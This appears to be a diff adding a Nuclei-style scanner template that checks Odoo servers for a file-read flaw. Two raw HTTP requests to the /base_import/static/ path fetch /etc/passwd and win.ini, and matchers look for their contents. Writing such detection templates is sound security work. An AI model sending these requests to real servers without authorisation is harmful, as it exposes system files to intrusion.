@@ -1,0 +1,29 @@
+id: odoo-file-read
+
+info:
+    name: Odoo file read
+    author: amos1
+    severity: high
+    
+http:
+  - raw:
+      - |+
+        GET /base_import/static/c:/windows/win.ini HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+
+      - |+
+        GET /base_import/static/etc/passwd HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+      - type: word
+        part: body
+        words:
+          - 'for 16-bit app support'
